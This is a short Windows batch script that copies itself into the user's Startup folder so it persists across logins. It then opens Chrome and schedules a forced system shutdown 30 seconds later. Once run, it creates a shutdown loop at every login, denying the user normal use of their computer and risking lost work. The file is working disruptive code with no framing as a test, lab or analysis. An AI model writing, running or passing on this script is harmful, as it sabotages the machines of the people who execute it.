@echo off
setlocal

rem Get the path to the current batch file
set "batch_path=%~dp0"

rem Set the path to the startup folder
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Move the batch file to the startup folder
move "%batch_path%%~nx0" "%startup_folder%"

if errorlevel 1 (
    echo Failed to move batch file to startup folder.
    exit /b
)

echo Batch file moved to startup folder.

start Chrome
if errorlevel 1 (
    echo Failed to start Chrome.
)

shutdown -s -t 30
if errorlevel 1 (
    echo Failed to initiate shutdown.
)
